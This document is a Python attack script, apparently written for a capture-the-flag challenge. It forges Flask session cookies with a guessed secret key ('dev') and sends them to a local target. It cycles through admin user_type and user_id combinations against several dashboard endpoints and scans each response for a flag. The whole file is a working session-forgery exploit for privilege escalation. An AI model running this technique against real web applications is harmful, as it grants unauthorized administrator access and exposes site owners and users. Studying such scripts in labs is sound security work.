import requests
import re
from itsdangerous import URLSafeTimedSerializer
import hashlib

# Target URL
base_url = "http://127.0.0.1:32883"

# Working secret key
secret_key = 'dev'

def forge_flask_session(secret_key, session_data):
    """Forge a Flask session cookie"""
    try:
        serializer = URLSafeTimedSerializer(
            secret_key,
            salt='cookie-session',
            signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
        )
        forged_cookie = serializer.dumps(session_data)
        return forged_cookie
    except Exception as e:
        print(f"[!] Error forging session: {e}")
        return None

print("[*] Testing admin user_type combinations")
print("="*80)

# Different admin-focused session variations
session_variations = [
    # Admin user_type with different user_ids
    {'user_id': 1, 'user_type': 'admin'},
    {'user_id': 0, 'user_type': 'admin'},
    {'user_id': 999, 'user_type': 'admin'},
    {'user_id': 10000, 'user_type': 'admin'},
    
    # Other admin-related types
    {'user_id': 1, 'user_type': 'administrator'},
    {'user_id': 1, 'user_type': 'root'},
    {'user_id': 1, 'user_type': 'superuser'},
    
    # Minimal session with just user_type
    {'user_type': 'admin'},
]

# All possible endpoints to check
endpoints_to_test = [
    '/dashboard',
    '/admin_dashboard',
    '/admin/dashboard', 
    '/api/admin',
    '/api/dashboard',
]

found_flag = False

for session_data in session_variations:
    if found_flag:
        break
        
    forged_cookie = forge_flask_session(secret_key, session_data)
    if not forged_cookie:
        continue
        
    for endpoint in endpoints_to_test:
        if found_flag:
            break
            
        url = f"{base_url}{endpoint}"
        cookies = {'session': forged_cookie}
        
        try:
            response = requests.get(url, cookies=cookies, allow_redirects=True, timeout=5)
            
            # Look for FLAG pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            
            # Only print non-404, non-redirect responses or if flag found
            if response.status_code not in [404, 302] or flag_match:
                print(f"\n[+] Session: {session_data}")
                print(f"[+] Endpoint: {endpoint}")
                print(f"[+] Status: {response.status_code} | Length: {len(response.content)}B")
                
                if flag_match:
                    print(f"[!] FLAG FOUND: {flag_match.group(0)}")
                    print(f"[+] Full Response:\n{response.text}")
                    found_flag = True
                    break
                else:
                    print(f"[+] Response preview:\n{response.text[:500]}")
                    
        except Exception as e:
            print(f"[-] Error testing {endpoint}: {e}")

if not found_flag:
    print("\n[-] No flag found with admin user_type variations")
    print("\n[*] The dashboard may require:")
    print("    1. Valid user_id from actual database")
    print("    2. Different session cookie name")
    print("    3. Additional authentication mechanism")
    print("\n[*] Next step: Try to enumerate valid user_ids or find another attack vector")

